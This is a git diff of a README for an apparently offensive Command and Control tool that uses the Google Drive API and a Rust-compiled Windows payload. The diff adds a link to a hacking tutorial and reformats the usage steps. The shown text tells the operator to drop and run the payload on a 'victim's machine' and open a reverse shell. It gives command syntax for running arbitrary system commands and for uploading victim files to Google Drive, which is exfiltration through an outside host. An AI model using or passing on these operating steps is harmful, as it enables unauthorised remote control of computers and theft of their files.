@@ -8,7 +8,7 @@ This project provides a Command and Control (C2) system using the Google Drive A
 - Command execution on the victim's machine through a TCP connection
 - Works with a Google Service Account for authentication
 # Prerequisites
-- Google Service Account: You need to create a Google Cloud project, enable the Google Drive API, and download the Service Account credentials (JSON).
+- Google Service Account: You need to create a Google Cloud project, enable the Google Drive API, and download the Service Account credentials (JSON). (Refer to this "[Hacking Tutorial: Google Sheets Command and Control (C2) Server](https://maxlikessecurity.medium.com/hacking-tutorial-google-sheets-command-and-control-c2-server-999e4dbc89fc)" by Max Likes Security to know how to enable Drive API and extract json service account.)
 - Rust Toolchain: Ensure you have Rust installed. If not, install it from Rust's official site.
 ## Dependencies 📦
 
@@ -73,34 +73,27 @@ After compiling, transfer the compiled .exe payload to the victim's machine and 
 - Execute commands: Any system command can be executed as follows:
 ```
 <command>
-```
 For example:
-```
 dir
 ```
 - Upload a file to Google Drive:
 ```
 upload;<file_path>
-```
 For example:
-```
 upload;C:\Users\Administrator\Documents\example.txt
 ```
 Download a file from Google Drive:
 ```
 download;<file_id>;<local_file_path>
-```
 For example:
-```
 download;1vjkwFQJXMpVps5Zd2yD54syoXMEw98Fb;C:\Users\Administrator\Downloads\test.png
 ```
 6. Example C2 Usage
-   
-  1/ Start the C2 server: Run the c2-server.py script on your attacker machine.
+  - 1/ Start the C2 server: Run the c2-server.py script on your attacker machine.
   
-  2/ Run the payload: Drop and execute the compiled payload on the victim's machine.
+  - 2/ Run the payload: Drop and execute the compiled payload on the victim's machine.
   
-  3/ Command execution: After the reverse shell is established, issue commands such as file upload, download, or OS command execution.
+  - 3/ Command execution: After the reverse shell is established, issue commands such as file upload, download, or OS command execution.
 <p align="center">
   <img alt="Logo" src="img/c2script.png" height="100%" width="100%">
 </p>
